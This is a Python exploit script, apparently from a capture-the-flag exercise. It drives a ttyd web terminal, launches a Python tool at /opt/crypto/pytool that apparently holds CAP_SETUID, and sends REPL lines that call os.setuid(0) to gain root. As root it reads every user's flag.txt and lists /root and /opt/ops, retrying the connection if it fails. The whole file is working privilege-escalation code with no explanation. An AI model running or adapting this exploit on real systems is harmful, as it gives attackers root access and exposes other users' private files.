"""Escalate via pytool's CAP_SETUID and enumerate every flag on the box."""
import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ttyd_client import Shell  # noqa: E402

# Sent to the REPL one line at a time so each executes immediately.
LINES = [
    "import os, pwd, glob, subprocess as sp",
    "os.setuid(0)",
    "print('WHO', os.getuid(), os.geteuid())",
    "print('FLAGS')",
    "print(sp.run(['sh','-c','for f in /home/*/flag.txt; do echo \"== $f\"; cat $f; done'],"
    "capture_output=True, text=True).stdout)",
]


async def body(sh):
    await sh.read(2.5)
    await sh.send("/opt/crypto/pytool")
    await sh.read(3.5)

    for line in LINES:
        await sh.send(line)
        print(await sh.read(12.0))

    # Also try a straight root read of /root and /opt/ops for anything else
    for line in [
        "print('ROOTDIR', sp.run(['ls','-la','/root/'],capture_output=True,text=True).stdout)",
        "print('OPSDIR', sp.run(['ls','-la','/opt/ops/'],capture_output=True,text=True).stdout)",
    ]:
        await sh.send(line)
        print(await sh.read(8.0))

    await sh.send("exit()")
    await sh.read(1.5)


async def amain():
    for attempt in range(6):
        try:
            async with Shell(cols=150, rows=60) as sh:
                await body(sh)
                return
        except Exception as e:
            print(f"[attempt {attempt + 1}] {type(e).__name__}: {e}", flush=True)
            await asyncio.sleep(5)
    print("[!] all attempts failed", flush=True)


asyncio.run(amain())
